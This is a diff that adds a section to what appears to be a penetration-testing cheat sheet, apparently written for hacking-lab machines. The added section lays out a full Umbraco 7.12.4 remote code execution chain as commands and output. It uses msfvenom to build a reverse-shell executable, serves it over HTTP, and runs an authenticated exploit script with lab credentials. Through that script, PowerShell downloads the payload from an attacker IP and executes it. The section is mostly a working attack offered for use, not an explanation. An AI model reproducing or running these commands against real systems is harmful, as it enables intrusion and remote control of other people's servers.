@@ -1075,3 +1075,23 @@ openssl passwd 'passwd'
 ```bash
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 ```
+
+### Umbraco 7.12.4 exploit
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=7777 -f exe > revshell7777.exe$ python -m http.server --bind 10.10.15.222 8080
+$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command ls'
+
+
+    Directory: C:\windows\system32\inetsrv
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/19/2020   3:11 PM                Config
+d-----        2/19/2020   3:11 PM                en
+d-----        2/19/2020   3:11 PM                en-US
+...
+
+$ python3 ./49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell.exe -a '-NoProfile -Command wget http://192.168.45.176/revshell7777.exe -Outfile C:/Users/Public/noraj.exe'
+$ python3 ./49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell.exe -a '-NoProfile -Command C:/Users/Public/noraj.exe'
+```
